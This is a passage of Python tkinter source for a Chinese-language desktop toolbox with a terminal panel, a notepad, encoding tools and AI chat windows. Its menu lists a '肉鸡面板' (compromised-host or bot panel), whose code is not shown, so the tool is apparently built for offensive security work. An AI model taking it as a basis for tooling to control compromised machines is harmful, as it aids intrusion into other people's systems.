    entry_Event(windowSize_Higth,f"{root.winfo_height()}")  # 给entry 控件添加一个提示信息

    # 四、设置保存按钮，以保存信息
    def save_button():
        def check(windowSize_Widths, windowSize_Higths):
            if windowSize_Widths < 0 and windowSize_Higths < 0:
                return False
            return True

        windowSize_Widths = int(windowSize_Width.get())
        windowSize_Higths = int(windowSize_Higth.get())
        # 校验
        if check(windowSize_Widths, windowSize_Higths):
            update_windowSize_json(windowSize_Widths,windowSize_Higths)

            messagebox.showinfo("保存成功", f"设置成功，重启后生效！")
            windowSize_config.destroy()  # 关闭窗口

            # root.destroy()  # 'root' 是主窗口的实例
        else:
            # 进行菜单栏名称重复警告
            messagebox.showinfo("修改失败！", f"未知错误！")

    save_button = Button(windowSize_config, text="设置", command=save_button)
    save_button.grid(row=2, columnspan=2, pady=10)

    # 五、确保行和列被正确地拉伸以适应内容
    windowSize_config.grid_columnconfigure(1, weight=1)
    windowSize_config.grid_rowconfigure(0, weight=1)
    windowSize_config.grid_rowconfigure(1, weight=1)
    windowSize_config.grid_rowconfigure(2, weight=1)

# 展示更新记录
def update_record_show():
    # 创建更新记录子窗口
    update_window = Toplevel(root)
    update_window.title("版本更新记录")
    update_window.config(bg="white")
    update_window.resizable(False, False)
    center_window(update_window, 500, 500)
    update_window.grab_set()

    # 创建Canvas和滚动条
    canvas = Canvas(update_window, bg="white", highlightthickness=0)
    canvas.pack(side="left", fill="both", expand=True, padx=20, pady=20)

    # 创建内容框架
    content_frame = Frame(canvas, bg="white")
    canvas.create_window((0, 0), window=content_frame, anchor="nw", width=460)

    # 标题
    Label(content_frame, text="📝 版本更新记录",
          font=("Microsoft YaHei", 16, "bold"),
          bg="white", fg="#007acc").pack(pady=(0, 20))

    # 获取更新记录内容
    update_data = get_update_record_content()
    sorted_versions = sorted(update_data.keys(), reverse=True)

    # 显示每个版本
    for idx, version in enumerate(sorted_versions):
        content = update_data[version]

        # 版本号
        version_frame = Frame(content_frame, bg="white")
        version_frame.pack(fill="x", pady=(10, 5))

        Label(version_frame, text=f"版本 {version}",
              font=("Microsoft YaHei", 13, "bold"),
              bg="white", fg="#2980b9").pack(anchor="w")

        # 更新内容
        for line in content.strip().split('\n'):
            if line.strip():
                Label(content_frame, text=line.strip(),
                      font=("Microsoft YaHei", 11),
                      bg="white", fg="#34495e",
                      wraplength=420, justify="left").pack(anchor="w", padx=(10, 0), pady=2)

        # 80%宽度水平分割线（不是最后一个版本）
        if idx != len(sorted_versions) - 1:
            separator = Frame(content_frame, height=1, bg="#bdc3c7")
            separator.pack(fill="x", padx=10, pady=15)  # 左右各46px边距，约80%宽度

    # 关闭按钮
    Button(content_frame, text="关闭", command=update_window.destroy,
           font=("Microsoft YaHei", 10), bg="#007acc", fg="white",
           padx=30, pady=5).pack(pady=20)

    # 配置Canvas滚动
    def configure_canvas(event):
        canvas.itemconfig("all", width=event.width)
        content_frame.update_idletasks()
        canvas.config(scrollregion=canvas.bbox("all"))

    canvas.bind("<Configure>", configure_canvas)
    content_frame.update_idletasks()
    canvas.config(scrollregion=canvas.bbox("all"))

    # 鼠标滚轮
    def on_mousewheel(event):
        canvas.yview_scroll(int(-event.delta/120), "units")

    canvas.bind_all("<MouseWheel>", on_mousewheel)

# 展示菜单栏
def show_menu():
    # 1、新建菜单栏控件
    menu_bar = Menu(root)

    # 2、添加菜单栏控件：添加控件
    menu_tool_add = Menu(menu_bar, tearoff=0)
    menu_tool_add.add_command(label="添加菜单栏", command=add_menus)
    menu_tool_add.add_command(label="添加导航栏", command=add_navigation_bar)
    menu_tool_add.add_command(label="添加工具", command=add_Tools)
    menu_tool_add.add_separator()
    menu_tool_add.add_command(label="AI模型设置", command=add_ai_setting)
    menu_tool_add.add_command(label="窗口大小", command=windowSize_Setting)
    menu_tool_add.add_separator()
    menu_tool_add.add_command(label="更新记录", command=update_record_show)
    menu_bar.add_cascade(label="工具箱设置", menu=menu_tool_add)

    # 3、动态的添加菜单栏
    if config_json_null_check():
        for menu_name in get_menu_name_all():
            menu_bar.add_cascade(label=menu_name, command=lambda menu_name=menu_name: reload_canvas(menu_name))

    # 4、加载已定义的控件
    # kimi_ai
    menu_bar.add_cascade(label="AI对话模型", command=lambda menu_name="ai_ask": reload_canvas(menu_name))
    # 百度翻译
    menu_bar.add_cascade(label="汉英翻译", command=lambda menu_name="baidu_fanyi": reload_canvas(menu_name))
    # 添加本地终端（编解码）
    # menu_bar.add_cascade(label="本地终端", command=lambda menu_name="local_cmd": reload_canvas(menu_name))
    menu_bar.add_cascade(label="编解码", command=lambda menu_name="encode_decode": reload_canvas(menu_name))
    # 肉鸡面板
    menu_bar.add_cascade(label="肉鸡面板", command=lambda menu_name="rouji_panel": reload_canvas(menu_name))
    # 临时笔记
    menu_bar.add_cascade(label="临时笔记", command=lambda menu_name="note_nemu": reload_canvas(menu_name))

    root.config(menu=menu_bar)   # 配置到菜单栏到root上

# 创建本地终端面板
def create_local_cmd():
    global local_cmd_frame
    global font_size

    # 进行颜色设置
    def init_tags(text_widget):
        text_widget.tag_configure("prompt", foreground="green")
        text_widget.tag_configure("cwd", foreground="blue")
        text_widget.tag_configure("orange", foreground="#9503FF")

    # 滑轮放大放小事件
    def adjust_font_size(event):
        global font_size

        if platform.system() == "Windows":
            delta = event.delta / 120
        else:
            delta = event.delta

        if delta > 0:
            font_size += 1
        elif delta < 0:
            font_size = max(8, font_size - 1)
        text_widget.config(font=("JetBrains Mono", font_size))

    # 回车enter 事件
    def handle_return(event):
        # 获取输入的命令
        input_line = text_widget.get("end-2c linestart", "end-1c").strip()
        # 使用re.search查找匹配
        match = re.search(r">\s*(.*)", input_line)  # 匹配 > 后面的内容
        # 如果找到匹配项，输出匹配的内容
        if match:
            input_line = match.group(1)
            if input_line:
                # 处理输入的命令
                execute_command(input_line)
        else:
            print("没有找到匹配的内容")
        # 插入新的提示符
        text_widget.insert(END, f"\n⚔ [ {getpass.getuser()} on", "prompt")
        text_widget.insert(END, f" ☢ {os.getcwd()}]\n", "cwd")
        text_widget.insert(END, "☣ #> ", "orange")

        text_widget.mark_set(INSERT, END)   # 将光标移动到提示符的后面
        text_widget.see(END)  # 滚动到最新行
        return "break"

    # 命令处理函数
    def execute_command(command):
        # 添加换行符以确保结果在新的一行开始
        text_widget.insert(END, "\n")
        if command.startswith('cd '):
            change_directory(command[3:].strip())
        elif command == 'ls':
            list_directory()
        elif command == 'pwd':
            print_working_directory()
        elif command == 'exit':
            # quit()
            clear_screen()
        elif command == 'clear':
            clear_screen()
        else:
            run_system_command(command)
        # 将光标移动到提示符的后面
        text_widget.mark_set(INSERT, END)
        text_widget.see(END)  # 滚动到最新行

    def change_directory(path):
        try:
            os.chdir(path)
            # prompt = f'\n☪ {getpass.getuser()} on {os.getcwd()} > '
        except FileNotFoundError:
            text_widget.insert(END, f"Directory {path} not found\n")
        except NotADirectoryError:
            text_widget.insert(END, f"{path} is not a directory\n")
        except PermissionError:
            text_widget.insert(END, f"No permission to access {path}\n")

    def list_directory():
        try:
            files = os.listdir()
            for file in files:
                text_widget.insert(END, f"{file}\n")
        except PermissionError:
            text_widget.insert(END, "No permission to list directory contents\n")

    def print_working_directory():
        text_widget.insert(END, f"{os.getcwd()}\n")

    def run_system_command(command):
        try:
            result = subprocess.run(command, shell=True, text=True, capture_output=True)
            text_widget.insert(END, result.stdout)
            if result.stderr:
                text_widget.insert(END, result.stderr)
        except Exception as e:
            text_widget.insert(END, f"Error: {e}\n")

    def complete_event(event):
        # 获取当前文本框中的单词
        index = event.widget.index("insert")
        line = event.widget.get("insert linestart", "insert lineend")
        prefix = line.split(None, 1)[0]

        # 获取所有可能的补全选项
        options = {name for name in os.listdir('.') if name.startswith(prefix)}

        # 如果只有一个选项，或者用户已经输入了路径分隔符，补全当前单词
        if len(options) == 1 or os.path.sep in prefix:
            event.widget.delete("insert linestart", END)
            event.widget.insert("insert", next(iter(options)))
        else:
            # 否则，显示所有可能的补全选项

            # 这里只是一个简单的例子，实际应用中可能需要更复杂的逻辑
            print("Options:", options)

        # 阻止Tab默认行为
        return "break"

    def clear_screen():
        # 清除文本框中的所有内容
        text_widget.delete("1.0", END)

    # 创建 local_cmd_frame 并添加到 root
    local_cmd_frame = Frame(root, bg="white", highlightbackground="black", highlightthickness=1, relief="solid")
    local_cmd_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
    # 创建文本编辑区域，设置字体大小和样式
    text_widget = Text(local_cmd_frame, wrap="word", bg="#D9D9D9", fg="black", font=("JetBrains Mono", 12, "bold"), undo=True) # 字体有：Microsoft YaHei、SimSun、JetBrains Mono、Courier New
    text_widget.grid(row=0, column=0, sticky="nsew")
    # 添加滚动条
    scroll = Scrollbar(local_cmd_frame, command=text_widget.yview)
    scroll.grid(row=0, column=1, sticky="ns")
    # 将滚动条与文本编辑区域关联
    text_widget.config(yscrollcommand=scroll.set)
    # 调整 row 和 column 权重，使它们可以扩展
    local_cmd_frame.grid_rowconfigure(0, weight=1)
    local_cmd_frame.grid_columnconfigure(0, weight=1)

    # 绑定 enter 回车 和 ctrl+滑轮 事件
    text_widget.bind("<Return>", lambda event: handle_return(event))
    text_widget.bind("<Control-MouseWheel>", lambda event: adjust_font_size(event))
    # 绑定 Tab 键到补全事件
    text_widget.bind("<Tab>", complete_event)

    # 初始化标签属性
    init_tags(text_widget)

    # 展示命令提示符
    text_widget.insert(END, f"\n⚔ [ {getpass.getuser()} on", "prompt")
    text_widget.insert(END, f" ☢ {os.getcwd()}]\n", "cwd")
    text_widget.insert(END, "☣ #> ", "orange")

    local_cmd_frame.grid_forget()  # 隐藏本地终端

# 创建临时笔记面板（Notepad++ 风格）
def create_note():
    global note_frame, text_area, line_numbers_canvas, last_line_count

    THEME = {
        "bg": "#D9D9D9",          # 与AI对话模型相同的背景色
        "fg": "#2c3e50",          # 深蓝色文字
        "line_highlight": "#d1e7ff",  # 当前行高亮
        "cursor": "#007acc",      # 光标颜色
        "selection": "#a8d1ff",   # 选中背景
        "gutter_bg": "#e0e0e0",   # 行号区域背景
        "gutter_fg": "#999"       # 行号颜色
    }

    last_line_count = 0
    FONT = ("Consolas", 11)

    note_frame = Frame(root, bg="white", highlightbackground="#ccc",
                       highlightthickness=1, relief="solid")
    note_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)

    line_numbers_canvas = Canvas(note_frame,
                                 width=50,
                                 bg=THEME["gutter_bg"],
                                 highlightthickness=0,
                                 takefocus=0)
    line_numbers_canvas.grid(row=0, column=0, sticky="ns")
    line_numbers_canvas.grid_propagate(False)

    text_area = Text(note_frame,
                     wrap="none",
                     bg=THEME["bg"],
                     fg=THEME["fg"],
                     insertbackground=THEME["cursor"],
                     insertwidth=2,
                     selectbackground=THEME["selection"],
                     selectforeground="black",
                     font=FONT,
                     undo=True,
                     relief="flat",
                     borderwidth=0,
                     padx=5,
                     pady=5)
    text_area.grid(row=0, column=1, sticky="nsew")

    def update_line_numbers():
        global last_line_count
        try:
            line_numbers_canvas.delete("all")
            canvas_height = line_numbers_canvas.winfo_height()
            if canvas_height <= 1:
                # 面板隐藏时不自我重排，避免整会话持续 100ms 空转；
                # 面板重新显示时会触发 <Configure> → on_canvas_resize 重排行号
                return

            first_visible = text_area.index("@0,0")
            last_visible = text_area.index(f"@0,{text_area.winfo_height()}")
            first_line = int(first_visible.split('.')[0])
            last_line = int(last_visible.split('.')[0])
            canvas_width = line_numbers_canvas.winfo_width()

            for line_num in range(first_line, last_line + 2):
                bbox = text_area.dlineinfo(f"{line_num}.0")
                if bbox:
                    y_pos = bbox[1]
                    if -10 <= y_pos <= canvas_height + 10:
                        line_numbers_canvas.create_text(
                            canvas_width - 8,
                            y_pos,
                            text=str(line_num),
                            anchor="ne",
                            font=FONT,
                            fill=THEME["gutter_fg"]
                        )

            last_line_count = last_line
        except Exception as e:
            print(f"更新行号出错: {e}")

    def text_yscroll_set(first, last):
        v_scroll.set(first, last)
        note_frame.after_idle(update_line_numbers)

    v_scroll = Scrollbar(note_frame, command=text_area.yview)
    v_scroll.grid(row=0, column=2, sticky="ns")

    h_scroll = Scrollbar(note_frame, orient="horizontal", command=text_area.xview)
    h_scroll.grid(row=1, column=1, sticky="ew")

    text_area.config(yscrollcommand=text_yscroll_set,
                     xscrollcommand=h_scroll.set)

    def search_text(search_term):
        if search_term:
            text_area.tag_remove("highlight", '1.0', END)
            start_idx = '1.0'
            while True:
                start_idx = text_area.search(search_term, start_idx, nocase=True, stopindex=END)
                if not start_idx:
                    break
                end_idx = f"{start_idx}+{len(search_term)}c"
                text_area.tag_add("highlight", start_idx, end_idx)
                start_idx = end_idx
            text_area.tag_configure("highlight", background="yellow")

    def replace_text(search_term, replace_term):
        if search_term is not None and replace_term is not None:
            start_idx = '1.0'
            while True:
                start_idx = text_area.search(search_term, start_idx, nocase=True, stopindex=END)
                if not start_idx:
                    break
                end_idx = f"{start_idx}+{len(search_term)}c"
                text_area.delete(start_idx, end_idx)
                text_area.insert(start_idx, replace_term)
                start_idx = f"{start_idx}+{len(replace_term)}c"

    def on_search_replace():
        def apply_changes():
            search_term = search_entry.get()
            replace_term = replace_entry.get()
            if search_term:
                replace_text(search_term, replace_term)
            search_text(search_term)
            search_replace_window.destroy()

        search_replace_window = Toplevel(root)
        search_replace_window.title("替换")
        Label(search_replace_window, text="搜索内容:").grid(row=0, column=0, padx=5, pady=5, sticky="e")
        search_entry = Entry(search_replace_window, width=40)
        search_entry.grid(row=0, column=1, padx=5, pady=5)
        Label(search_replace_window, text="替换内容:").grid(row=1, column=0, padx=5, pady=5, sticky="e")
        replace_entry = Entry(search_replace_window, width=40)
        replace_entry.grid(row=1, column=1, padx=5, pady=5)
        replace_entry.bind("<Return>", lambda event: apply_changes())
        search_entry.focus_set()
        Button(search_replace_window, text="全部替换", command=apply_changes).grid(
            row=2, column=0, columnspan=2, pady=10)
        center_window(search_replace_window, 370, 120)

    def on_ctrl_f(event):
        # 创建自定义搜索窗口，而不是用 simpledialog
        search_window = Toplevel(root)
        search_window.title("搜索")
        search_window.config(bg="white")
        search_window.resizable(False, False)
        center_window(search_window, 300, 100)  # 设置大小并居中
        search_window.grab_set()

        Label(search_window, text="输入搜索内容:", bg="white").pack(pady=(10, 5))
        search_entry = Entry(search_window, width=35)
        search_entry.pack(padx=10)
        search_entry.focus_set()

        def do_search():
            search_term = search_entry.get()
            if search_term:
                search_text(search_term)
            search_window.destroy()

        search_entry.bind("<Return>", lambda e: do_search())
        Button(search_window, text="搜索", command=do_search,
               bg="#007acc", fg="white", padx=20).pack(pady=10)

    def on_ctrl_h(event):
        text_area.insert("insert", " ")
        on_search_replace()

    def highlight_current_line(event=None):
        text_area.tag_remove("current_line", "1.0", "end")
        try:
            if text_area.tag_ranges("sel"):
                return
        except:
            pass
        cursor_index = text_area.index("insert")
        line_num = cursor_index.split(".")[0]
        line_start = f"{line_num}.0"
        line_end = f"{line_num}.end+1c"
        text_area.tag_add("current_line", line_start, line_end)
        text_area.see(cursor_index)

    def on_text_change(event=None):
        note_frame.after_idle(update_line_numbers)
        highlight_current_line()

    def insert_spaces(event):
        text_area.insert("insert", " " * 4)
        return "break"

    def on_mousewheel(event):
        delta = int(-1 * (event.delta / 120))
        text_area.yview_scroll(delta, "units")
        note_frame.after_idle(update_line_numbers)
        return "break"

    text_area.tag_configure("current_line", background=THEME["line_highlight"])
    text_area.tag_configure("highlight", background="yellow", foreground="black")

    text_area.bind("<Tab>", insert_spaces)
    text_area.bind("<Control-f>", on_ctrl_f)
    text_area.bind("<Control-h>", on_ctrl_h)
    text_area.bind("<KeyRelease>", lambda e: on_text_change())
    text_area.bind("<ButtonRelease-1>", lambda e: on_text_change())
    text_area.bind("<MouseWheel>", on_mousewheel)
    line_numbers_canvas.bind("<MouseWheel>", on_mousewheel)

    def bind_to_all_children(parent):
        parent.bind("<MouseWheel>", on_mousewheel)
        for child in parent.winfo_children():
            bind_to_all_children(child)

    bind_to_all_children(note_frame)

    def on_canvas_resize(event):
        note_frame.after_idle(update_line_numbers)

    line_numbers_canvas.bind("<Configure>", on_canvas_resize)

    note_frame.after(200, lambda: [update_line_numbers(), highlight_current_line()])

    note_frame.grid_rowconfigure(0, weight=1)
    note_frame.grid_columnconfigure(1, weight=1)
    note_frame.grid_forget()

# 创建编解码面板
def create_encode_decode():
    global encode_decode_frame

    # 创建主框架
    encode_decode_frame = Frame(root, bg="white", highlightbackground="black", highlightthickness=1, relief="solid")

    # 创建一个统一的按钮容器，实现水平排列和自动换行，放在输入框上方
    buttons_container = Frame(encode_decode_frame)
    buttons_container.grid(row=0, column=0, columnspan=2, sticky="nsew", padx=5, pady=5)

    # 左侧输入框
    input_text = scrolledtext.ScrolledText(encode_decode_frame, wrap="word", height=10, font=("Consolas", 12))
    input_text.grid(row=1, column=0, padx=5, pady=5, sticky="nsew")

    # 右侧输出框
    output_text = scrolledtext.ScrolledText(encode_decode_frame, wrap="word", height=10, font=("Consolas", 12))
    output_text.grid(row=1, column=1, padx=5, pady=5, sticky="nsew")

    # 添加加解密功能函数
    def base64_encode_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            output_widget.delete("1.0", END)
            output_widget.insert(END, base64_encode(text))

    def base64_decode_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            try:
                output_widget.delete("1.0", END)
                output_widget.insert(END, base64_decode(text).decode('utf-8'))
            except Exception as e:
                output_widget.insert(END, f"解码错误: {str(e)}")

    def url_encode_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            output_widget.delete("1.0", END)
            output_widget.insert(END, url_encode(text))

    def url_decode_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            try:
                output_widget.delete("1.0", END)
                output_widget.insert(END, url_decode(text))
            except Exception as e:
                output_widget.insert(END, f"解码错误: {str(e)}")

    def unicode_encode_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            output_widget.delete("1.0", END)
            output_widget.insert(END, unicode_encode(text))

    def unicode_decode_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            try:
                output_widget.delete("1.0", END)
                output_widget.insert(END, unicode_decode(text))
            except Exception as e:
                output_widget.insert(END, f"解码错误: {str(e)}")

    def utf8_decode_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            try:
                output_widget.delete("1.0", END)
                output_widget.insert(END, utf8_decode(text))
            except Exception as e:
                output_widget.insert(END, f"解码错误: {str(e)}")

    def json_format_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            try:
                output_widget.delete("1.0", END)
                json_data = json_format(text)
                output_widget.insert(END, json_data)
            except Exception as e:
                output_widget.insert(END, f"解码错误: {str(e)}")

    def md5_encode_action(input_widget, output_widget):
        text = input_widget.get("1.0", END).strip()
        if text:
            output_widget.delete("1.0", END)
            output_widget.insert(END, md5_encode(text))

    # 添加所有按钮，使用pack布局实现水平排列和自动换行，移除间隙，根据文本内容自动调整宽度
    Button(buttons_container, text="URL编码", command=lambda: url_encode_action(input_text, output_text)).pack(side="left", padx=0, pady=0)
    Button(buttons_container, text="URL解码", command=lambda: url_decode_action(input_text, output_text)).pack(side="left", padx=0, pady=0)
    Button(buttons_container, text="Base64编码", command=lambda: base64_encode_action(input_text, output_text)).pack(side="left", padx=0, pady=0)
    Button(buttons_container, text="Base64解码", command=lambda: base64_decode_action(input_text, output_text)).pack(side="left", padx=0, pady=0)
    Button(buttons_container, text="Unicode编码", command=lambda: unicode_encode_action(input_text, output_text)).pack(side="left", padx=0, pady=0)
    Button(buttons_container, text="Unicode解码", command=lambda: unicode_decode_action(input_text, output_text)).pack(side="left", padx=0, pady=0)
    Button(buttons_container, text="乱码修复", command=lambda: utf8_decode_action(input_text, output_text)).pack(side="left", padx=0, pady=0)
    Button(buttons_container, text="Json格式化", command=lambda: json_format_action(input_text, output_text)).pack(side="left", padx=0, pady=0)
    Button(buttons_container, text="MD5编码", command=lambda: md5_encode_action(input_text, output_text)).pack(side="left", padx=0, pady=0)

    # 配置行列权重
    encode_decode_frame.grid_rowconfigure(1, weight=1)  # 输入输出框所在行权重为1
    encode_decode_frame.grid_columnconfigure(0, weight=1)
    encode_decode_frame.grid_columnconfigure(1, weight=1)

    encode_decode_frame.grid_forget()

# 创建单栏的AI对话面板
def create_ai_ask():
    global AI_ask_frame

    # 创建一个线程安全的队列来存储响应数据
    response_queue = queue.Queue()

    def on_send(entry, chat_box):
        # 从文本框中获取用户输入
        question = text_box.get("1.0", END)

        # 检查用户输入消息
        if question.strip() == "" or question.strip() == placeholder_text:
            return

        # 将用户输入添加到聊天框
        chat_box.configure(state='normal')
        chat_box.insert(END, f"用户: {question}\n\n", 'user')
        chat_box.update()
        chat_box.configure(state='disabled')
        chat_box.yview(END)  # 自动滚动到文本框底部

        # 清空文本框
        text_box.delete("1.0", END)

        # 定义一个函数来处理AI的响应，支持加粗标记
        def handle_response_with_markup(chat_box, response):
            chat_box.configure(state='normal')
            chat_box.tag_configure('bold', font=('Arial', 12, 'bold'))
            chat_box.tag_configure('normal', font=('Arial', 12))
            chat_box.tag_configure('code', foreground='#414110', font=('Courier', 10))

            # 正则表达式匹配加粗和代码块
            pattern = re.compile(r'(\*\*.*?\*\*)|(```.*?```)', re.DOTALL)
            last_end = 0

            for match in pattern.finditer(response):
                start, end = match.span()
                # 插入非匹配部分
                if start > last_end:
                    chat_box.insert(END, response[last_end:start], 'normal')
                # 根据匹配类型设置标签
                if match.group(1):  # 加粗文本
                    text = match.group(1)[2:-2]  # 去除加粗标记
                    chat_box.insert(END, text, 'bold')
                elif match.group(2):  # 代码块
                    code_block = match.group(2)[3:-3]  # 去除代码块标记
                    chat_box.insert(END, code_block, 'code')
                last_end = end

            # 插入最后的文本和换行
            if last_end < len(response):
                chat_box.insert(END, response[last_end:], 'normal')

            # 插入换行符，确保文本框底部完整显示
            chat_box.insert(END, '\n')

            chat_box.configure(state='disabled')
            chat_box.yview(END)  # 自动滚动到文本框底部

        # 定义一个函数来执行ai_main，并把响应放入队列
        def ai_request_thread(chat_box, question, ai_name):
            try:
                response = ai_main(ai_name=ai_name, msg=question)
                response_queue.put(response)  # 将响应放入队列
                handle_response_with_markup(chat_box, response)  # 直接处理响应
            except Exception as e:
                messagebox.showinfo("出错！","请检查 网络配置 和 API 配置是否正常！")

        # 创建并启动线程
        ai_name = get_ai_json_use_True_name()   # 获取use_page 为1的AI名称
        request_thread = threading.Thread(target=ai_request_thread, args=(chat_box, question, ai_name), daemon=True)  # P1-4: 后台线程，避免非 daemon 线程拖住进程退出
        request_thread.start()

    # 设置文本框的标签样式
    def setup_chat_box(chat_box):
        chat_box.tag_configure('user', foreground='red')  # 用户文本红色
        chat_box.tag_configure('ai', foreground='blue')      # AI响应文本蓝色

    # 创建 AI 对话框的 Frame
    ai_frame = Frame(root, bg="white", highlightbackground="black", highlightthickness=1, relief="solid")
    ai_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
    # 创建滚动文本框用于显示对话记录
    chat_box = scrolledtext.ScrolledText(ai_frame, wrap="word", bg="#D9D9D9", fg="black", font=("SimSun", 12))
    chat_box.grid(row=0, column=0, columnspan=2, sticky="nsew")

    # 禁止输入
    chat_box.config(state=DISABLED)

    # 创建输入框，使用 Text 组件以支持换行
    text_box = Text(ai_frame, width=50, height=4, wrap="word")
    text_box.grid(row=1, column=0, sticky="ew", padx=10, pady=5)

    # 定义一个函数来添加和删除提示语
    def set_placeholder(text_box, placeholder_text):
        if text_box.get("1.0", END).strip() == "":
            # 如果文本框为空，则插入提示语，并设置样式
            text_box.configure(state='normal')
            text_box.insert("1.0", placeholder_text)
            text_box.tag_configure("placeholder", foreground="grey", font=("Arial", 12))
            text_box.tag_add("placeholder", "1.0", "1.end")
            text_box.configure(state='disabled')
        else:
            # 如果文本框不为空，移除提示语样式
            text_box.tag_remove("placeholder", "1.0", END)

    # 初始设置提示语
    placeholder_text = "Shift+Enter 发送消息"
    set_placeholder(text_box, placeholder_text)

    # 绑定文本框的焦点进入和离开事件，以控制提示语的显示和隐藏
    def on_focusout(event):
        set_placeholder(event.widget, placeholder_text)

    def on_focusin(event):
        if event.widget.get("1.0", END).strip() == placeholder_text:
            event.widget.configure(state='normal', background='white')
            event.widget.delete("1.0", END)

    # 绑定文本框获取与失去焦点事件
    text_box.bind("<FocusOut>", on_focusout)
    text_box.bind("<FocusIn>", on_focusin)

    # 绑定 Shift + Enter 组合键到发送消息的函数
    text_box.bind("<Shift-Return>", lambda event: on_send(text_box, chat_box))

    # 创建发送按钮
    send_button = Button(ai_frame, text="发送", command=lambda: on_send(text_box, chat_box))
    send_button.grid(row=1, column=1, padx=10, pady=5, sticky="ew")

    setup_chat_box(chat_box)

    # 配置行和列的权重
    ai_frame.grid_rowconfigure(0, weight=1)  # 让滚动文本框占据主要空间
    ai_frame.grid_rowconfigure(1, weight=0)  # 让输入框和按钮不扩展
    ai_frame.grid_columnconfigure(0, weight=1)  # 让第0列 (chat_box 和 entry) 扩展
    ai_frame.grid_columnconfigure(1, weight=0)  # 让第1列 (send_button) 不扩展

    # 更新ai 的frame
    AI_ask_frame = ai_frame
    # 隐藏ai_ask
    AI_ask_frame.grid_forget()

    # 做json配置文件的初始化
    if config_ai_json_null_check() == False: # 未配置好进行初始化
        try:
            create_ai_json()
        except Exception as e:  # 报错，说明 config 文件夹未存在
            create_dir("config")
            create_ai_json()

# 创建双栏的AI对话
def create_ai_ask_two():
    global AI_ask_frame

    def on_send(entry, chat_box, ai_name):
        # 从文本框中获取用户输入
        question = text_box.get("1.0", END)

        # 检查用户输入消息
        if question.strip() == "" or question.strip() == placeholder_text:
            return

        # 将用户输入添加到聊天框
        chat_box.configure(state='normal')
        chat_box.insert(END, f"用户: {question}\n\n", 'user')
        chat_box.update()
        chat_box.configure(state='disabled')
        chat_box.yview(END)  # 自动滚动到文本框底部

        # 清空文本框
        text_box.delete("1.0", END)

        # 定义一个函数来处理AI的响应，支持加粗标记
        def handle_response_with_markup(chat_box, response):
            chat_box.configure(state='normal')
            chat_box.tag_configure('bold', font=('Arial', 12, 'bold'))
            chat_box.tag_configure('normal', font=('Arial', 12))
            chat_box.tag_configure('code', foreground='#414110', font=('Courier', 10))

            # 正则表达式匹配加粗和代码块
            pattern = re.compile(r'(\*\*.*?\*\*)|(```.*?```)', re.DOTALL)
            last_end = 0

            for match in pattern.finditer(response):
                start, end = match.span()
                # 插入非匹配部分
                if start > last_end:
                    chat_box.insert(END, response[last_end:start], 'normal')
                # 根据匹配类型设置标签
                if match.group(1):  # 加粗文本
                    text = match.group(1)[2:-2]  # 去除加粗标记
                    chat_box.insert(END, text, 'bold')
                elif match.group(2):  # 代码块
                    code_block = match.group(2)[3:-3]  # 去除代码块标记
                    chat_box.insert(END, code_block, 'code')
                last_end = end

            # 插入最后的文本和换行
            if last_end < len(response):
                chat_box.insert(END, response[last_end:], 'normal')

            # 插入换行符，确保文本框底部完整显示
            chat_box.insert(END, '\n')

            chat_box.configure(state='disabled')
            chat_box.yview(END)  # 自动滚动到文本框底部

        # 定义一个函数来执行ai_main，并把响应放入队列
        def ai_request_thread(chat_box, question, ai_name):
            # 创建一个线程安全的队列来存储响应数据
            response_queue = queue.Queue()
            try:
                response = ai_main(ai_name=ai_name, msg=question)
                response_queue.put(response)  # 将响应放入队列
                handle_response_with_markup(chat_box, response)  # 直接处理响应
            except Exception as e:
                messagebox.showinfo("出错！","请检查 网络配置 和 API 配置是否正常！")

        # 创建并启动线程
        # ai_name = get_ai_json_use_True_name()   # 获取use_page 为2的AI名称
        request_thread = threading.Thread(target=ai_request_thread, args=(chat_box, question, ai_name))
        request_thread.start()

    # 设置文本框的标签样式
    def setup_chat_box(chat_box):
        chat_box.tag_configure('user', foreground='red')  # 用户文本红色
        chat_box.tag_configure('ai', foreground='blue')      # AI响应文本蓝色

    # 创建 AI 对话框的 Frame
    ai_frame = Frame(root, bg="white", highlightbackground="black", highlightthickness=0, relief="solid")
    ai_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)

    # 创建左侧AI对话框
    left_ai_frame = Frame(ai_frame, bg="lightblue", highlightbackground="black", highlightthickness=1, relief="solid")
    left_ai_frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)

    # 创建右侧AI对话框
    right_ai_frame = Frame(ai_frame, bg="lightgreen", highlightbackground="black", highlightthickness=1, relief="solid")
    right_ai_frame.grid(row=0, column=1, columnspan=2, sticky="nsew", padx=5, pady=5)

    # 创建滚动文本框用于显示对话记录
    left_chat_box = scrolledtext.ScrolledText(left_ai_frame, wrap="word", bg="#D9D9D9", fg="black", font=("SimSun", 12))
    left_chat_box.grid(row=0, column=0, sticky="nsew")

    right_chat_box = scrolledtext.ScrolledText(right_ai_frame, wrap="word", bg="#D9D9D9", fg="black", font=("SimSun", 12))
    right_chat_box.grid(row=0, column=0, columnspan=2, sticky="nsew")

    # 禁止输入
    left_chat_box.config(state=DISABLED)
    right_chat_box.config(state=DISABLED)

    # 创建输入框，使用 Text 组件以支持换行
    text_box = Text(ai_frame, width=50, height=4, wrap="word")
    text_box.grid(row=1, column=0, columnspan=2, sticky="ew", padx=10, pady=5)

    # 定义一个函数来添加和删除提示语
    def set_placeholder(text_box, placeholder_text):
        if text_box.get("1.0", END).strip() == "":
            # 如果文本框为空，则插入提示语，并设置样式
            text_box.configure(state='normal')
            text_box.insert("1.0", placeholder_text)
            text_box.tag_configure("placeholder", foreground="grey", font=("Arial", 12))
            text_box.tag_add("placeholder", "1.0", "1.end")
            text_box.configure(state='disabled')
        else:
            # 如果文本框不为空，移除提示语样式
            text_box.tag_remove("placeholder", "1.0", END)

